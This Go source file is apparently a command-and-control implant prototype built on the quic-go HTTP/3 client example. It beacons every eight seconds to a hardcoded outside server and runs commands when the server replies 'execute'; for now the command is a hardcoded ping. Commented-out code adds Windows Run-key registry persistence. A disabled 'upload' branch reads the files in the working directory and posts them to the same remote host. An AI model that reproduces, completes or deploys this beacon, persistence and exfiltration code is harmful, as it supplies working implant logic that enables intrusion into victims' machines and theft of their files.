package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"time"

	// "golang.org/x/sys/windows/registry"

	"github.com/quic-go/quic-go"
	"github.com/quic-go/quic-go/http3"
	"github.com/quic-go/quic-go/internal/testdata"
	"github.com/quic-go/quic-go/internal/utils"
	"github.com/quic-go/quic-go/logging"
	"github.com/quic-go/quic-go/qlog"
)

// func persistenceWindows() {
// 	// Open registry key
// 	key, _, err := registry.CreateKey(
// 		registry.CURRENT_USER, // registry path
// 		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
// 		registry.ALL_ACCESS, // full access
// 	)

// 	if err != nil { // Handle error
// 		log.Fatal(err)
// 	}
// 	defer key.Close() // Close key

// 	// Overwrite value
// 	err = key.SetStringValue("", "C:\\Windows\\System32\\cmd.exe")
// 	if err != nil {
// 		log.Fatal(err)
// 	}

// 	fmt.Println("[+] Success!")
// }

func main() {
	verbose := flag.Bool("v", false, "verbose")
	quiet := flag.Bool("q", false, "don't print the data")
	keyLogFile := flag.String("keylog", "", "key log file")
	insecure := flag.Bool("insecure", false, "skip certificate verification")
	enableQlog := flag.Bool("qlog", false, "output a qlog (in the same directory)")
	flag.Parse()
	urls := flag.Args()

	logger := utils.DefaultLogger

	if *verbose {
		logger.SetLogLevel(utils.LogLevelDebug)
	} else {
		logger.SetLogLevel(utils.LogLevelInfo)
	}
	logger.SetLogTimeFormat("")

	var keyLog io.Writer
	if len(*keyLogFile) > 0 {
		f, err := os.Create(*keyLogFile)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()
		keyLog = f
	}

	pool, err := x509.SystemCertPool()
	if err != nil {
		log.Fatal(err)
	}
	testdata.AddRootCA(pool)

	var qconf quic.Config
	if *enableQlog {
		qconf.Tracer = func(ctx context.Context, p logging.Perspective, connID quic.ConnectionID) logging.ConnectionTracer {
			filename := fmt.Sprintf("client_%x.qlog", connID)
			f, err := os.Create(filename)
			if err != nil {
				log.Fatal(err)
			}
			log.Printf("Creating qlog file %s.\n", filename)
			return qlog.NewConnectionTracer(utils.NewBufferedWriteCloser(bufio.NewWriter(f), f), p, connID)
		}
	}
	roundTripper := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{
			RootCAs:            pool,
			InsecureSkipVerify: *insecure,
			KeyLogWriter:       keyLog,
		},
		QuicConfig: &qconf,
	}
	defer roundTripper.Close()
	hclient := &http.Client{
		Transport: roundTripper,
	}

	for {
		// Infinite loop
		for _, endpoint := range urls {
			cac_server_url := "https://cac.gachenot.eu:6121/"
			rsp, err := hclient.Get(cac_server_url + endpoint)
			if err != nil {
				log.Fatal(err)
			}
			logger.Infof("Got response for %s: %#v", cac_server_url, rsp)

			body := &bytes.Buffer{}
			_, err = io.Copy(body, rsp.Body)
			if err != nil {
				log.Fatal(err)
			}
			if *quiet {
				logger.Infof("Response Body: %d bytes", body.Len())
			} else {
				logger.Infof("Response Body:")
				logger.Infof("%s", body.Bytes())
			}
			fmt.Println(body)

			var responseBodyJson map[string]interface{}
			json.Unmarshal([]byte(body.Bytes()), &responseBodyJson)

			fmt.Println(responseBodyJson)
			if responseBodyJson["status"] == "ok" {
				fmt.Println("Success")
			} else if responseBodyJson["status"] == "execute" {
				fmt.Println("Execute")
				logger.Infof("%s", responseBodyJson)
				data, ok := responseBodyJson["data"].(map[string]interface{})
				if !ok {
					log.Fatal("invalid data type")
				}
				fmt.Println(data["args"])
				argsss := []string{"-c", "10", "1.1.1.1"}
				logger.Infof("%s", argsss)
				cmd := exec.Command("ping", argsss...)

				var outb, errb bytes.Buffer
				cmd.Stdout = &outb
				cmd.Stderr = &errb
				err := cmd.Run()
				if err != nil {
					log.Fatal(err)
				}
				cmd_err := cmd.Wait()
				if cmd_err != nil {
					log.Fatal(err)
				}
				fmt.Println("out:", outb.String(), "err:", errb.String())
				if err != nil {
					log.Fatal(err)
				}
			} else if responseBodyJson["status"] == "upload" {
				// /!\ This part of code is not working /!\ //

				// fmt.Println("Upload")
				// logger.Infof("%s", responseBodyJson)

				// files, err := os.ReadDir("./")
				// if err != nil {
				// 	log.Fatal(err)
				// }
				// fmt.Println(files)

				// for _, file := range files {
				// 	if file.IsDir() {
				// 		continue
				// 	}

				// 	var (
				// 		buf = new(bytes.Buffer)
				// 		w   = multipart.NewWriter(buf)
				// 	)

				// 	part, err := w.CreateFormFile("uploadfile", filepath.Base(file.Name()))
				// 	if err != nil {
				// 		log.Fatal("invalid data type 2")
				// 		// return []byte{}, err
				// 	}

				// 	_, err = part.Write(readFile(file.Name()))
				// 	if err != nil {
				// 		log.Fatal("invalid data type 3")
				// 		// return []byte{}, err
				// 	}

				// 	err = w.Close()
				// 	if err != nil {
				// 		log.Fatal("invalid data type 4")
				// 		// return []byte{}, err
				// 	}

				// 	req, err := http.NewRequest("POST", "https://cac.gachenot.eu/demo/upload", buf)
				// 	if err != nil {
				// 		log.Fatal("invalid data type 5")
				// 		// return []byte{}, err
				// 	}
				// 	req.Header.Add("Content-Type", w.FormDataContentType())

				// 	hclient := &http.Client{}
				// 	res, err := hclient.Do(req)
				// 	if err != nil {
				// 		log.Fatal("invalid data type 6")
				// 		// return []byte{}, err
				// 	}
				// 	defer res.Body.Close()

				// 	cnt, err := io.ReadAll(res.Body)
				// 	if err != nil {
				// 		log.Fatal("invalid data type 7")
				// 		// return []byte{}, err
				// 	}
				// 	logger.Infof("%s", cnt)
				// 	// return cnt, nil
				// 	// sendPostRequest("https://cac.gachenot.eu/demo/upload", content{fname: file.Name(), ftype: "file", fdata: readFile(file.Name())})
				// }
				// if err != nil {
				// 	log.Fatal(err)
				// }
			} else {
				fmt.Println("Failed")
			}
		}
		time.Sleep(8 * time.Second)
	}
}
